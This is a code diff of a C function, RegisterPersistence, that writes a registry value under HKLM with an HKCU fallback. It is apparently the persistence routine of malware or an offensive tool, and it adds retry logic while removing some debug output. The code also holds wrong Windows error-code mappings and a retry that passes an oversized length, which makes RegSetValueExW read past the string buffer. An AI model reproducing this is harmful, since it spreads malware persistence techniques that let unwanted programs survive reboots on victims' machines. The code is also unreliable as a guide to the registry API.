@@ -7,17 +7,13 @@ BOOL RegisterPersistence(void) {
     printf("[DEBUG] RegisterPersistence: Trying HKLM...\n");
     fflush(stdout);
 
-    // Debug: Print the actual path being used
-    printf("[DEBUG] Attempting to open: %ls\n", PERSIST_PATH);
-    fflush(stdout);
-
     // Try HKLM first, fallback to HKCU
     if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
     {
         printf("[DEBUG] HKLM opened successfully (Handle: %p)\n", (void*)hKey);
         fflush(stdout);
         
-        // Debug: Calculate the exact size for wide string
+        // Calculate the exact size for wide string
         wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
         size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
         
@@ -26,35 +22,30 @@ BOOL RegisterPersistence(void) {
         printf("[DEBUG] Calculated length: %lu bytes\n", (unsigned long)dataLen);
         fflush(stdout);
         
-        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
-                            (LPBYTE)testData, (DWORD)dataLen);
-        
-        printf("[DEBUG] HKLM RegSetValueExW result: %lu\n", ret);
-        fflush(stdout);
-        
-        if (ret == ERROR_SUCCESS) {
-            printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
-            fflush(stdout);
-            RegCloseKey(hKey);
-            return TRUE;
-        }
-        else {
-            printf("[DEBUG] HKLM SetValue failed: %lu\n", ret);
-            DWORD err = GetLastError();
-            printf("[DEBUG] Last Error: %lu\n", err);
+        // Retry logic: if ERROR_MORE_DATA, retry with larger buffer
+        for (int retry = 0; retry < 2; retry++) {
+            ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
+                                (LPBYTE)testData, (DWORD)dataLen);
+            
+            printf("[DEBUG] Retry %d: HKLM RegSetValueExW result: %lu\n", retry + 1, ret);
             fflush(stdout);
             
-            // Common errors:
-            // 0x8000000A (ERROR_MORE_DATA) - Buffer too small
-            // 0x8007000A (ERROR_BUFFER_OVERFLOW) - Same thing
-            // 0xC0000028 (ERROR_SUCCESS but already exists)
-            if (ret == 0x8000000A || ret == 0x8007000A) {
-                printf("[DEBUG] Buffer size error - retrying with larger buffer...\n");
-                // Retry with larger buffer
-                size_t dataLen2 = ((wcslen(testData) + 1) * sizeof(wchar_t)) + 1000;
-                ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
-                                    (LPBYTE)testData, (DWORD)dataLen2);
-                printf("[DEBUG] Retry result: %lu\n", ret);
+            if (ret == ERROR_SUCCESS) {
+                printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
+                fflush(stdout);
+                RegCloseKey(hKey);
+                return TRUE;
+            }
+            else if (ret == 0x8000000A || ret == 0x8007000A) {
+                // ERROR_MORE_DATA - try with larger buffer
+                dataLen = ((wcslen(testData) + 1) * sizeof(wchar_t)) + 4096;
+                printf("[DEBUG] Buffer overflow detected, retrying with larger buffer...\n");
+                fflush(stdout);
+            }
+            else if (ret == 0x80070005) {
+                // ERROR_ACCESS_DENIED - might need HKCU
+                printf("[DEBUG] Access denied, retrying with HKCU...\n");
+                fflush(stdout);
             }
         }
         
@@ -64,10 +55,8 @@ BOOL RegisterPersistence(void) {
         printf("[DEBUG] HKLM opened failed: %lu\n", ret);
         DWORD err = GetLastError();
         printf("[DEBUG] HKLM Last Error: %lu\n", err);
+        fflush(stdout);
         
-        // Error 298 = ERROR_MORE_DATA (usually means buffer size issue)
-        // Error 5 = ACCESS_DENIED (might need to use HKCU)
-        // Error 501 = ERROR_ACCESS_DENIED
         if (err == 5 || err == 501) {
             printf("[DEBUG] HKLM Access Denied, trying HKCU...\n");
             fflush(stdout);
@@ -84,7 +73,6 @@ BOOL RegisterPersistence(void) {
         printf("[DEBUG] HKCU opened successfully (Handle: %p)\n", (void*)hKey);
         fflush(stdout);
         
-        // Calculate the correct size for wide string
         wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
         size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
         
